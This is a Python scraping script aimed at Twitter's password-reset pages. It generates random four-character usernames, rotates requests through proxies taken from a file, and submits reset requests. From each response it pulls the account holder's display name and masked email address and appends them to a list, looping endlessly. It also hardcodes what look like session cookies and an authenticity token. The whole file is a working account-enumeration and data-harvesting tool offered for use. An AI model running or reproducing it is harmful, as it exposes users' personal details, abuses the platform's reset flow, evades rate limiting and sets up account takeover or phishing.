import requests
import random



ss = "1234567890poiuytrewqazxsdcvfgbnhjmkl"
proxy = []
r1 = requests.session()
Bad = 0
error = 0
Done = 0
def Seting():
    global proxy
    for xxx in open('proxy.txt','r').read().splitlines():
        proxy.append(xxx)
def Send_rest_password():
    global Bad,error,Done
    user = "".join(random.choice(ss) for _ in range(4))
    url = "https://twitter.com/account/begin_password_reset"
    headers = {
        "Host": "twitter.com",
        "User-Agent": "Mozilla/5.0 (X11; Linux i686; rv:78.0) Gecko/20100101 Firefox/78.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Content-Type": "application/x-www-form-urlencoded",
        "Content-Length": "83",
        "Referer": "https://twitter.com/account/begin_password_reset",
        "Origin": "https://twitter.com",
        "DNT": "1",
        "Upgrade-Insecure-Requests": "1",
        "Connection": "close",
        'Cookie': '_ga=GA1.2.1838947596.1608201042; __utma=43838368.1838947596.1608201042.1608667729.1608667729.1; __utmz=43838368.1608667729.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); dnt=1; kdt=BXeXybU33OxrAtKZ1O38ZNFSeWYA1C6Sf3XEvmq6; remember_checked_on=1; night_mode=2; mbox=PC#5eb1da21579f4407956ff1eb8f0ba03b.37_0#1674348147|session#374eee5953e5479ebf1e20ac3c613ded#1620901078; des_opt_in=Y; personalization_id="v1_+nVhcFPXRFJyHWcmPIOgBw=="; guest_id=v1%3A161524851179328268; eu_cn=1; gt=1394160161607098372; ct0=9c160c7f61d3e5a6a8a04020a31dad2f; _twitter_sess=BAh7DiIKZmxhc2hJQzonQWN0aW9uQ29udHJvbGxlcjo6Rmxhc2g6OkZsYXNo%250ASGFzaHsABjoKQHVzZWR7ADoPY3JlYXRlZF9hdGwrCAAswnh5AToMY3NyZl9p%250AZCIlNTliMmM1YjhiOTBhMThkMDAzOTU1OThkNWIxOGJjMmU6B2lkIiU3Zjkw%250ANmYwMzczM2IyNzU0ZDRhZjZhM2U5MWM4NDAyZiIJcHJycCIAOghwcnNpBzoI%250AcHJ1aQRQcwwJOghwcmlpBjoIcHJ2IgYx--e880ee2e3a8be0195c822ff7c67b800c72a655ef; att=1-ihq3nCa9Y5YQ8XzTefzBdJBVJF6E5G7RWIUQZwgd'}
    data = f'authenticity_token=bae3810d93c4ca9ccf1460c8d35f0cdddb9c629f&account_identifier={user}'
    p = str(random.choice(proxy))
    NewProxies = {
        'http': 'http://{}'.format(p),
        'https': 'http://{}'.format(p)}
    r1.proxies = NewProxies
    try:
        r = r1.post(url,headers=headers,data=data,timeout=4)
        if r.text.find('https://twitter.com/account/send_password_reset'):
            coo = r.cookies['_twitter_sess']
            url2 = 'https://twitter.com/account/send_password_reset'
            headers2 = {
                "Host": "twitter.com",
                "User-Agent": "Mozilla/5.0 (X11; Linux i686; rv:78.0) Gecko/20100101 Firefox/78.0",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.5",
                "Referer": "https://twitter.com/account/begin_password_reset",
                "DNT": "1",
                "Upgrade-Insecure-Requests": "1",
                "Connection": "close",
                'Cookie': f'_ga=GA1.2.1838947596.1608201042; __utma=43838368.1838947596.1608201042.1608667729.1608667729.1; __utmz=43838368.1608667729.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); dnt=1; kdt=BXeXybU33OxrAtKZ1O38ZNFSeWYA1C6Sf3XEvmq6; remember_checked_on=1; night_mode=2; mbox=PC#5eb1da21579f4407956ff1eb8f0ba03b.37_0#1674348147|session#374eee5953e5479ebf1e20ac3c613ded#1620901078; des_opt_in=Y; personalization_id="v1_+nVhcFPXRFJyHWcmPIOgBw=="; guest_id=v1%3A161524851179328268; eu_cn=1; gt=1394160161607098372; ct0=9c160c7f61d3e5a6a8a04020a31dad2f; _twitter_sess={coo}; att=1-ihq3nCa9Y5YQ8XzTefzBdJBVJF6E5G7RWIUQZwgd'}
            r2 = r1.get(url2,headers=headers2,timeout=5)
            i = str(r2.text)
            ii = str(r2.text)
            try:
                name = i.split('<div class="fullname">')[1]
                name_2 = name.split('</div>')[0]
                email = ii.split('Send an email to <strong dir="ltr">')[1]
                email_2 = email.split('</strong>')[0]
                with open('list.txt','a') as F:
                    F.write(f'[+] @{user} | {email_2} | {name_2}\n')
                    F.close()
                Done+=1
                print(f'\r[##] Done:{Done} Error:{error} Bad Proxy:{Bad}', end="")
            except:
                error+=1
                print(f'\r[##] Done:{Done} Error:{error} Bad Proxy:{Bad}', end="")
        else:
            error+=1
            print(f'\r[##] Done:{Done} Error:{error} Bad Proxy:{Bad}', end="")
    except:
        Bad+=1
        print(f'\r[##] Done:{Done} Error:{error} Bad Proxy:{Bad}',end="")


Seting()
while True:
    Send_rest_password()
